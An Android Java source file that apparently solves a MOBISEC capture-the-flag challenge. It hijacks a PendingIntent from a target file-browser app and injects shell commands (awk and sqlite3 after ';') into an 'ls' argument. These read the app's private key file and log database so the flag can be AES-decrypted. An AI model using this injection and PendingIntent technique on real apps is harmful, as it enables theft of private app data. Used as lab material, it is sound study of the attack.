package com.example.filebrowser;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.os.Bundle;


import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;


import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.nio.charset.Charset;
import java.security.Key;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Locale;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.SecretKeySpec;


public class MainActivity extends AppCompatActivity {

    public static final String upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    public static final String lower = upper.toLowerCase(Locale.ROOT);
    public static final String digits = "0123456789";
    public static final String alphanum = upper + lower + digits;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent i = new Intent();
        i.setComponent(new ComponentName("com.mobisec.filebrowser","com.mobisec.filebrowser.PluginActivity"));
        i.setAction("com.mobisec.browser.action.START_PLUGIN");
        startActivityForResult(i,400);

    }

    String[] key = new String[1];
    String encOper = "";

    @SuppressLint("Range")
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        try {

            Bundle bundle1 = data.getExtras();
            final PendingIntent pi1 = (PendingIntent) bundle1.get("pi");
            final Intent i1 = new Intent();
            i1.putExtra("debug", true);
            i1.putExtra("oper", "ls");
            i1.putExtra("arg", " ; awk 'NR==3'  /data/data/com.mobisec.filebrowser/shared_prefs/keys.xml");

            pi1.send(this, 1, i1, null, null);

            try {
                TimeUnit.SECONDS.sleep(2);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            String readfile = readFile("/sdcard/browser.log");
            Log.i("MOBISEC", readfile);
            key[0] = readfile.substring(23, 23 + 20);
            Log.i("MOBISEC", "key[0]: " + key[0]);

            byte[] aesKey = getAesKey(key[0]);
            Log.i("MOBISEC", "aesKey: " + Arrays.toString(aesKey));

            encOper = bin2hex(encrypt("genflag".getBytes(), aesKey));
            Log.i("MOBISEC", "encOper: " + encOper);


            // "    <string name="key">0Zg8mF4c0JEZuTVdj77t</string>"

            try {
                TimeUnit.SECONDS.sleep(2);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            final Intent i2 = new Intent();
            i2.putExtra("debug", true);
            i2.putExtra("oper", "ls");
            Log.i("MOBISEC", "encOper: " + encOper);
            //i2.putExtra("arg", " ;  sqlite3 /data/data/com.mobisec.filebrowser/databases/LogDb \"SELECT arg FROM log where oper= " + encOper + " ;\" > /sdcard/r.txt    ");
            i2.putExtra("arg", " ;  sqlite3 /data/data/com.mobisec.filebrowser/databases/LogDb \"SELECT arg FROM log where id=1 ;\" > /sdcard/r.txt    ");
            pi1.send(this, 2, i2, null, null);

            try {
                TimeUnit.SECONDS.sleep(2);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            String readfile1 = readFile("/sdcard/r.txt");
            Log.i("MOBISEC", readfile1);
            Log.i("MOBISEC", "aesKey: " + Arrays.toString(aesKey));
            String f = new String(decrypt(hex2bin(readfile1), aesKey));
            Log.w("MOBISEC",f);
        }
        catch  (Exception e) {
            Log.w("MOBISEC",Log.getStackTraceString(e));
        }


        /*try {
            byte[] aesKey = getAesKey(key[0]);
            String encOper = bin2hex(encrypt("genflag".getBytes(), aesKey));
            Cursor c = getContentResolver().query(Uri.parse("content://com.mobisec.provider.Log/log"), null, null, null, "oper");
            if (!c.moveToFirst()) {
                Log.e("MOBISEC","!c.moveToFirst()");
            }
            do {
                c.getString(c.getColumnIndex("id"));
                String oper = c.getString(c.getColumnIndex("oper"));
                String arg = c.getString(c.getColumnIndex("arg"));
                if (oper.equals(encOper)) {
                    //return new String(decrypt(hex2bin(arg), aesKey));
                    String f=new String(decrypt(hex2bin(arg), aesKey));
                    Log.e("MOBISEC",f);
                    break;
                }
            } while (c.moveToNext());
        } catch (Exception e) {
            Log.w("MOBISEC",Log.getStackTraceString(e));
        }*/




    }









    private String readFile(String filepath) throws IOException {
        StringBuilder sb = new StringBuilder("");
        try{
            File file = new File(filepath);
            FileInputStream fin = new FileInputStream(file);
            int length=fin.available();
            byte []buffer=new byte[length];
            int len = 0;
            while ((len = fin.read(buffer)) > 0){
                sb.append(new String(buffer, 0, len));
            }
        }
        catch (Exception e) {
            Log.i("MOBISEC",Log.getStackTraceString(e));
        }
        return sb.toString();
    }//https://www.jianshu.com/p/4c020b45f9e3 , https://blog.csdn.net/Zadarrien_China/article/details/55226068,


    private static byte[] getAesKey(String k) throws Exception {
        return hash(k.getBytes());
    }


    public static byte[] encrypt(byte[] in, byte[] key) throws Exception {
        Key aesKey = new SecretKeySpec(key, "AES");
        Cipher encryptCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        encryptCipher.init(1, aesKey);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, encryptCipher);
        cipherOutputStream.write(in);
        cipherOutputStream.flush();
        cipherOutputStream.close();
        return outputStream.toByteArray();
    }

    public static byte[] decrypt(byte[] ct, byte[] key) throws Exception {
        Key aesKey = new SecretKeySpec(key, "AES");
        Cipher encryptCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        encryptCipher.init(2, aesKey);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, encryptCipher);
        cipherOutputStream.write(ct);
        cipherOutputStream.flush();
        cipherOutputStream.close();
        return outputStream.toByteArray();
    }

    public static byte[] hash(byte[] in) throws Exception {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(in);
        return md.digest();
    }

    public static String getRandomString(int len) {
        Random generator = new Random();
        StringBuilder randomStringBuilder = new StringBuilder();
        for (int i = 0; i < len; i++) {
            String str = alphanum;
            randomStringBuilder.append(str.charAt(generator.nextInt(str.length())));
        }
        return randomStringBuilder.toString();
    }

    static String bin2hex(byte[] data) {
        return String.format("%0" + (data.length * 2) + 'x', new BigInteger(1, data));
    }

    /*public static byte[] hex2bin(String hex)   {
        if (hex.length() % 2 <= 0) {
            byte[] r = new byte[hex.length() / 2];
            int i = hex.length();
            while (i > 0) {
                int i2 = i - 1;
                i = i2 - 1;
                r[(i / 2) - 1] = (byte) (digit(hex.charAt(i2)) | (digit(hex.charAt(i)) << 4));
            }
            return r;
        }
       throw new NumberFormatException("Hexadecimal input string must have an even length.");
    }*/

    /**
     * 十六进制转换字符串
     * @param hex  String 十六进制
     * @return String 转换后的字符串
     */
    public static byte[]  hex2bin(String hex) {
        String digital = "0123456789abcdef";
        char[] hex2char = hex.toCharArray();
        byte[] bytes = new byte[hex.length() / 2];
        int temp;
        for (int i = 0; i < bytes.length; i++) {
            temp = digital.indexOf(hex2char[2 * i]) * 16;
            temp += digital.indexOf(hex2char[2 * i + 1]);
            bytes[i] = (byte) (temp & 0xff);
        }
        //return new String(bytes);
        return bytes;
    } //https://www.jianshu.com/p/6c147330f4b9


    private static int digit(char ch) {
        int r = Character.digit(ch, 16);
        if (r >= 0) {
            return r;
        }
        throw new NumberFormatException("Invalid hexadecimal string: " + ch);
    }

}